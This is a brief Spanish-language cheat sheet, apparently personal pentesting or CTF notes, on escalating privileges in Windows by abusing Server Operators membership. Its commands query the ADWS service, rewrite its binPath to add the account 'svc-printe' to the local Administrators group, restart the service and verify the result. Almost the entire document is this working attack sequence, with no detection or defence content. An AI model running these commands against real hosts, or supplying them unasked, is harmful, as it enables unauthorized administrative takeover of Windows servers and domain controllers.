Escalada de Privilegios: Grupo Server Operators y Privilegio Restore

CMD: Buscar Servicios Privilegiados que corran como LocalSystem (SYSTEM)

services
sc.exe qc ADWS

CMD: Editar Path para ejecutar un comando

# Agregar nuestro usuario a administrators
sc.exe config ADWS binPath= "cmd /c net localgroup Administrators svc-printe /add"

CMD: Reiniciar el servicio. Se debe producir un fallo al reiniciar

sc stop ADWS
sc start ADWS

CMD: Confirmar que hemos conseguido ser ADMINS

net localgroup Administrators
# Si somos del grupo Administrators pero no tenemos aún privilegios reinicia la shell
